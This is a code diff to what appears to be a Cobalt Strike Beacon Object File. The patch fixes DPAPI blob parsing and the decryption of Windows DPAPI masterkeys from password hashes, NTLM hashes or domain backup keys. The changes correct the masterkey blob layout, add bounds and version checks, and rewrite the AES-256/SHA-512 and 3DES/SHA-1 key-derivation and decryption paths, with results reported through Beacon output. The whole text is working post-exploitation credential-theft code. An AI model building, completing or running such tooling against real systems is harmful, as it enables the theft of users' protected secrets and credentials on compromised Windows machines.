@@ -92,7 +92,13 @@ BOOL parse_dpapi_blob(const BYTE* raw, int raw_len, DPAPI_BLOB* blob) {
     memcpy(&blob->provider, raw + offset, 16);
     offset += 16;
 
+    /* MasterKeyVersion (4 bytes) */
+    if (offset + 4 > raw_len) return FALSE;
+    blob->masterkey_version = *(DWORD*)(raw + offset);
+    offset += 4;
+
     /* Master key GUID (16 bytes) */
+    if (offset + 16 > raw_len) return FALSE;
     memcpy(&blob->masterkey_guid, raw + offset, 16);
     offset += 16;
 
@@ -225,6 +231,7 @@ BOOL describe_dpapi_blob(const BYTE* raw, int raw_len,
     }
 
     if (guid_str) {
+        BeaconPrintf(CALLBACK_OUTPUT, "    masterkey ver  : %u\n", blob.masterkey_version);
         BeaconPrintf(CALLBACK_OUTPUT, "    masterkey GUID : %s\n", guid_str);
     }
 
@@ -277,6 +284,7 @@ BOOL describe_dpapi_blob(const BYTE* raw, int raw_len,
             int dec_len = 0;
 
             if (decrypt_blob(blob.data, blob.data_len,
+                             blob.salt, blob.salt_len,
                              mk_sha1, 20,
                              blob.alg_crypt, blob.alg_hash,
                              &decrypted, &dec_len)) {
@@ -343,19 +351,18 @@ BOOL describe_dpapi_blob(const BYTE* raw, int raw_len,
  * Decrypt a DPAPI masterkey blob using a pre-key.
  * Pre-key is derived from: password hash, NTLM hash, domain backup key, etc.
  *
- * Masterkey blob structure:
+ * Masterkey blob structure (Impacket / SharpSCCM compatible):
  * [0-3]   version
- * [4-7]   salt length
- * [8+salt_len]  salt
- * [+4]    rounds
- * [+4]    algHash
- * [+4]    algCrypt
- * [+encrypted]  encrypted masterkey
+ * [4-19]  salt (16 bytes)
+ * [20-23] rounds
+ * [24-27] algHash
+ * [28-31] algCrypt
+ * [32+]   encrypted masterkey
  */
 BOOL decrypt_masterkey(const BYTE* mk_bytes, int mk_len,
                        const BYTE* key, int key_len,
                        BYTE* out_sha1) {
-    if (!mk_bytes || mk_len < 96 || !key || !out_sha1) return FALSE;
+    if (!mk_bytes || mk_len < 96 || !key || key_len <= 0 || !out_sha1) return FALSE;
 
     int offset = 0;
 
@@ -363,13 +370,12 @@ BOOL decrypt_masterkey(const BYTE* mk_bytes, int mk_len,
     DWORD version = *(DWORD*)(mk_bytes + offset);
     offset += 4;
 
-    /* Salt */
-    DWORD salt_len = *(DWORD*)(mk_bytes + offset);
-    offset += 4;
+    if (version == 0 || version > 5) return FALSE;
 
-    if (offset + (int)salt_len > mk_len) return FALSE;
+    /* Salt is always 16 bytes for masterkey blobs */
+    if (offset + 16 > mk_len) return FALSE;
     const BYTE* salt = mk_bytes + offset;
-    offset += salt_len;
+    offset += 16;
 
     /* Iterations/rounds */
     if (offset + 4 > mk_len) return FALSE;
@@ -386,85 +392,69 @@ BOOL decrypt_masterkey(const BYTE* mk_bytes, int mk_len,
     DWORD alg_crypt = *(DWORD*)(mk_bytes + offset);
     offset += 4;
 
+    if (rounds == 0 || rounds > 10000000) return FALSE;
+
     /* Encrypted data */
     const BYTE* enc_data = mk_bytes + offset;
     int enc_len = mk_len - offset;
     if (enc_len <= 0) return FALSE;
 
-    /* Determine PBKDF2 output key length based on crypt algorithm */
-    int dk_len;
-    switch (alg_crypt) {
-        case CALG_3DES:
-        case CALG_3DES_112:
-            dk_len = 24;  /* 3DES key */
-            break;
-        case CALG_AES_256:
-            dk_len = 32;
-            break;
-        case CALG_AES_128:
-            dk_len = 16;
-            break;
-        default:
-            dk_len = 24;
-            break;
-    }
-
-    /* Step 1: PBKDF2 with key and salt */
-    BYTE derived[64];
-
-    switch (alg_hash) {
-        case CALG_SHA1:
-            if (!pbkdf2_hmac_sha1(key, key_len, salt, salt_len, rounds, derived, dk_len))
-                return FALSE;
-            break;
-        case CALG_SHA_256:
-            if (!pbkdf2_hmac_sha256(key, key_len, salt, salt_len, rounds, derived, dk_len))
-                return FALSE;
-            break;
-        case CALG_SHA_512:
-            if (!pbkdf2_hmac_sha512(key, key_len, salt, salt_len, rounds, derived, dk_len))
-                return FALSE;
-            break;
-        default:
-            return FALSE;
-    }
-
-    /* Step 2: Derive encryption and HMAC keys from PBKDF2 output */
-    BYTE final_key[64];
-    if (!derive_key(derived, dk_len, alg_hash, final_key, dk_len + 16))
-        return FALSE;
-
-    /* Step 3: Decrypt the masterkey blob */
     BYTE* decrypted = NULL;
     int dec_len = 0;
+    BOOL result = FALSE;
 
-    switch (alg_crypt) {
-        case CALG_3DES:
-        case CALG_3DES_112:
-            if (!triple_des_decrypt(final_key, 24, final_key + 24, 8,
-                                    enc_data, enc_len, &decrypted, &dec_len))
-                return FALSE;
-            break;
-        case CALG_AES_256:
-            if (!aes_decrypt(final_key, 32, final_key + 32, 16,
-                             enc_data, enc_len, &decrypted, &dec_len))
-                return FALSE;
-            break;
-        default:
+    if (alg_crypt == CALG_AES_256 && alg_hash == CALG_SHA_512) {
+        BYTE derived_prekey[48];
+        BYTE round1_hmac[64];
+        BYTE round2_hmac[64];
+
+        if (!pbkdf2_hmac_sha512(key, key_len, salt, 16, rounds,
+                                derived_prekey, sizeof(derived_prekey))) {
             return FALSE;
+        }
+
+        if (!aes_decrypt(derived_prekey, 32, derived_prekey + 32, 16,
+                         enc_data, enc_len, &decrypted, &dec_len)) {
+            return FALSE;
+        }
+
+        if (!decrypted || dec_len < 16 + 64 + 64) goto cleanup;
+
+        int output_len = dec_len - 16 - 64;
+        if (output_len < 64) goto cleanup;
+
+        if (!hmac_sha512(key, key_len, decrypted, 16, round1_hmac)) goto cleanup;
+        if (!hmac_sha512(round1_hmac, 64, decrypted + (dec_len - output_len),
+                         output_len, round2_hmac)) goto cleanup;
+        if (memcmp(decrypted + 16, round2_hmac, 64) != 0) goto cleanup;
+
+        result = sha1_hash(decrypted + (dec_len - output_len), 64, out_sha1);
+        goto cleanup;
     }
 
-    if (!decrypted || dec_len < 20) {
-        if (decrypted) intFree(decrypted);
-        return FALSE;
+    if ((alg_crypt == CALG_3DES || alg_crypt == CALG_3DES_112) &&
+        (alg_hash == CALG_HMAC || alg_hash == CALG_SHA1)) {
+        BYTE derived_prekey[32];
+
+        if (!pbkdf2_hmac_sha1(key, key_len, salt, 16, rounds,
+                              derived_prekey, sizeof(derived_prekey))) {
+            return FALSE;
+        }
+
+        if (!triple_des_decrypt(derived_prekey, 24, derived_prekey + 24, 8,
+                                enc_data, enc_len, &decrypted, &dec_len)) {
+            return FALSE;
+        }
+
+        if (!decrypted || dec_len < 40 + 64) goto cleanup;
+
+        result = sha1_hash(decrypted + 40, 64, out_sha1);
+        goto cleanup;
     }
 
-    /* Step 4: The decrypted masterkey — compute SHA1 hash for the cache */
-    int mk_actual_len = dec_len;
-    sha1_hash(decrypted, mk_actual_len, out_sha1);
-
-    intFree(decrypted);
-    return TRUE;
+cleanup:
+    if (decrypted) intFree(decrypted);
+    return result;
 }
 
 /* ---- SHA-based masterkey decryption (domain backup key path) ---- */
